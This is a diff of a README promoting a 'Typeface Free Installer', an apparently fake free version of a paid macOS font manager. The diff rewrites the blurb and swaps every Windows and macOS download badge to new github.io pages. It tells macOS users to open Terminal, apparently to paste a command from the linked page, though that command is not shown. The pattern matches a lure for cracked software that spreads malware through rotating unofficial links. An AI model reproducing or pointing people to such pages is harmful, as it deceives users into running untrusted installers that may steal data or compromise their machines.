@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Font+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Typeface Free Installer** — Typeface is a premium macOS font manager for discovering, organizing, and previewing fonts. Works without internet access, no account required. Full offline installation.
+**💻 Typeface Free Installer** — Typeface is a macOS font manager with a beautiful, photography-inspired browsing interface. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Typeface](https://img.shields.io/badge/⬇_Install_Typeface-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Typeface](https://img.shields.io/badge/⬇_Install_Typeface-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Typeface
 
-Typeface is a premium macOS font manager for discovering, organizing, and previewing fonts. Browse your installed fonts with live text previews, tag and organize fonts into collections, activate and deactivate fonts to keep your system clean, and find fonts by visual similarity. Typeface's beautiful interface makes font management an enjoyable part of the design workflow.
+Typeface is a macOS font manager with a beautiful, photography-inspired browsing interface. It provides smart collections, custom tags, font comparison view, Google Fonts sync, and Adobe Creative Cloud integration for professional font workflow management.
 
 ---
 
 ## ❌ Problem: Typeface is hard to access
 
-- **macOS Only** — No Windows version
-- **Commercial License** — Paid application
-- **Font Activation** — Activating fonts still requires manual OS font installation in some cases
-- **Collection Sync** — Font collection sync across Macs requires manual export/import
+- **macOS Only** — No Windows or Linux version
+- **Paid License** — Requires purchase from Mac App Store
+- **Niche Audience** — Most useful for designers with large font collections
+- **No Activation for All Apps** — Some apps require system font installation for compatibility
 
 ---
 
@@ -61,9 +61,9 @@ Typeface is a premium macOS font manager for discovering, organizing, and previe
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Typeface is a premium macOS font manager for discovering, organizing, and previe
 
 <div align="center">
 
-[![⬇ Install Typeface](https://img.shields.io/badge/⬇_Install_Typeface-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Typeface](https://img.shields.io/badge/⬇_Install_Typeface-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Typeface is a premium macOS font manager for discovering, organizing, and previe
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Typeface is a premium macOS font manager for discovering, organizing, and previe
 
 ---
 
-**Typeface Free Installer** — Typeface is a premium macOS font manager for discovering, organizing, and previewing fonts. Install without internet connection today!
+**Typeface Free Installer** — Typeface is a macOS font manager with a beautiful, photography-inspired browsing interface. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Typeface](https://img.shields.io/badge/⬇_Install_Typeface-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Typeface](https://img.shields.io/badge/⬇_Install_Typeface-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
